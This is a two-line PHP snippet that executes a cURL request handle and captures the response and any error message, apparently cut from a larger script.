 $response = curl_exec($curl);
 $err = curl_error($curl);
